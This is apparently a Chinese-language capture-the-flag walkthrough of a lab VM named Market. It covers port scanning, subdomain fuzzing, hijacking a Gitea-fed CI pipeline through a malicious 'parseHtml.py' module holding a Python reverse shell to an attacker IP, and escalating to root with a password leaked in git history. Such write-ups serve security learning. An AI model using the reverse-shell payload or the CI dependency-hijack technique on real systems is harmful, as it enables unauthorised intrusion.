## Nmap

先扫全端口：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p0-65535 192.168.205.140
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-05 00:34 -0400
Nmap scan report for 192.168.205.140
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:E3:88:BB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.23 seconds
```

开放了 `22/80/3000`，优先看 Web。

## Web

80 端口只有 Apache 默认页面，重点看 3000 端口响应：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.140:3000 -i | head -20
HTTP/1.1 200 OK
...
<meta name="author" content="Gitea - Git with a cup of tea">
<meta property="og:url" content="http://market.dsz/">
```

页面揭露当前环境是一个 Gitea 服务，并且显式绑定了域名 `market.dsz`，将其写入本地 hosts：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo '192.168.205.140 market.dsz' | sudo tee -a /etc/hosts
```

使用 wfuzz 进行子域名枚举：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ wfuzz -c -u "http://market.dsz" -H "HOST:FUZZ.market.dsz" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 933
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                        
=====================================================================

000000019:   200        166 L    393 W      4071 Ch     "dev - dev"
```

发现新的子域名 `dev`，继续更新 hosts：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -1 /etc/hosts
192.168.205.140 market.dsz dev.market.dsz
```

访问 `dev.market.dsz`，页面是一个 "Market CI"，展示了内部项目构建流水线日志：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl dev.market.dsz
...
<div class='section'><div class='label'>① Fetching Repositories</div><div class='box'><pre><span class='act'>↻</span> Processing <span class='ln'>gitea/product-parser</span> ... 
    <span class='ln'>    ↪  existing repo, git pull</span>
    <span class='ok'>[OK]</span>
</pre></div></div>

<div class='section'><div class='label'>② Assembling Workspace (collecting .py deps)</div><div class='box'><pre><span class='act'>[†]</span> Scanning sibling repos for dependency modules...
<span class='ok'>[✓] Assembly done.</span>
</pre></div></div>

<div class='section'><div class='label'>③ Executing Main Project</div><div class='box'><pre>
──────────────────────────────────────────────────────────
  python3 product-parser/main.py
──────────────────────────────────────────────────────────
...
```

页面显示系统会拉取 Gitea 上**所有的公开代码仓库**到工作区目录 `/opt/market/dev/workspace` 内合并，最后执行 `product-parser/main.py`。

回到 Gitea 平台（3000端口），直接查阅公开仓库 `gitea/product-parser` 中的 `main.py` 代码：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://192.168.205.140:3000/gitea/product-parser/src/branch/main/main.py
```

源码中泄露出存在路径劫持与依赖加载隐患：

```python
_CWD = os.path.dirname(os.path.abspath(__file__)) if "__file__" in dir() else os.getcwd()
sys.path.insert(0, _CWD)

for _item in os.listdir(os.path.dirname(_CWD) if os.path.dirname(_CWD) != _CWD else "."):
    _candidate = os.path.join(os.path.dirname(_CWD), _item)
    if os.path.isdir(_candidate) and _item != os.path.basename(_CWD):
        sys.path.insert(0, _candidate)

HIJACKED = False
try:
    import parseHtml
    HIJACKED = True
    print(f"[+] Loaded parseHtml module from: {parseHtml.__file__}")
...
```

也就是说，它的 CI 会将同级目录全部加入 `sys.path`，随后试图 `import parseHtml`。结合 `dev.market.dsz` 上的构建原理，如果我们在自己提交的仓库内放一个名为 `parseHtml.py` 的文件，CI 脚本会自动收集并将该文件拷贝覆盖到 `product-parser` 工作目录，从而达成劫持执行。

## RCE

由于在 3000 端口 Gitea 允许注册公开账号并公开创建自己的仓库。创建名为 `parseHtml` 的仓库，并在仓库中新建 `parseHtml.py`，写入 Python 反弹 Shell Payload 触发 CI 执行：

```python
import os,pty,socket
s=socket.socket()
s.connect(("192.168.205.128",8888))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/bash")
```

在攻击机开启监听，并通过点击页面上的 `▶ Re-Run Pipeline` 按钮提交 POST 重新触发构建流水线：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -s -X POST http://dev.market.dsz/
```

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ penelope -p 8888
[+] Listening for reverse shells on 0.0.0.0:8888
[+] [New Reverse Shell] => Market 192.168.205.140 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
[+] PTY upgrade successful via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
www-data@Market:/opt/market/dev/workspace/product-parser$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 枚举

获取 Shell 后在系统内进行信息收集，发现本地 `/opt` 目录下还存在另一个 git 构建产物目录：

```bash
www-data@Market:/opt/market/local/product-parser$ ls -al
total 24
drwxr-xr-x 3 root root 4096 May 29 22:26 .
drwxr-xr-x 3 root root 4096 May 29 22:26 ..
drwxr-xr-x 8 root root 4096 May 29 22:27 .git
-rw-r--r-- 1 root root    7 May 29 22:26 README.md
-rw-r--r-- 1 root root    9 May 29 22:26 hi
-rw-r--r-- 1 root root 2470 May 29 22:26 main.py
```

尝试使用 `git log` 查看历史提交时出现所有者怀疑错误：

```bash
www-data@Market:/opt/market/local/product-parser$ git log
fatal: detected dubious ownership in repository at '/opt/market/local/product-parser'
To add an exception for this directory, call:

        git config --global --add safe.directory /opt/market/local/product-parser
```

直接使用参数 `-c safe.directory=...` 绕过限制查看提交记录：

```bash
www-data@Market:/opt/market/local/product-parser$ git -c safe.directory=/opt/market/local/product-parser log -p
commit 0c4d5d99bcbc5a1cd014b4a9aa041544fe1b28ee (HEAD -> main)
Author: Your Name <you@example.com>
Date:   Fri May 29 22:27:08 2026 -0400

    root password is: qM538hk1occB5enubOIP
...
```

在 root 用户提交历史的信息里直接泄露出了当前系统的 root 密码。

## Root

直接使用发现的密码切换 root 用户，完成提权：

```bash
www-data@Market:/opt/market/local/product-parser$ su -
Password: 
root@Market:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Market:~# cat /root/root.txt /home/myq/user.txt 
flag{root-234598edcb14f0861baa4edce7e97b7f}
flag{user-370e21075ff14b9ab9fe70cf1b8c576c}
```